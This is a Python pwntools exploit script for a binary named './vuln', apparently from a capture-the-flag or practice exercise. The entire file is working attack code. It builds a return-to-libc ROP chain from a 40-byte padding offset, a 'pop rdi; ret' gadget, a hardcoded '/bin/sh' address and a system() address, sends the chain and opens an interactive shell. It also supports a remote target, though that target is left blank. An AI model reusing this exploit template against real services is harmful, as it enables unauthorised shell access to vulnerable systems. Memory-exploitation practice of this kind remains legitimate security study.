#!/bin/python3
from pwn import *
import sys

binary = "./vuln"
elf = context.binary = ELF(binary, False)
context.terminal = ["terminator", "-x", "bash", "-c"]
context.log_level  = 'debug'
libc = elf.libc
rop = ROP(elf)

script = '''

'''


def start(*args, **kwargs):
    usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
    # [ip, port]
    REMOTE = []
    if args:
        arguments = list(args)
        arguments.insert(0, elf.path)
        return process(arguments)

    if not args and not kwargs:
        if len(sys.argv) > 1:
            if sys.argv[1] == 'gdb':
                return gdb.debug(elf.path, gdbscript=script)
            elif sys.argv[1] == 'remote':
                return remote(REMOTE[0], REMOTE[1])
            else:
                print("INVALID ARGUMENT")
                print(usage)
                sys.exit(0)
        else:
            return process(elf.path)

def main():
    offset = 40
    system = 0x0000000000401257
    libc_base = 0x00007ffff7dc4000
    binsh = 0x00196031 + libc_base
    
    payload = flat(
        cyclic(offset),
        rop.find_gadget(['pop rdi', 'ret'])[0],
        binsh,
        system
    )

    io = start()
    io.sendline(payload)
    io.interactive()




if __name__ == "__main__":
    main()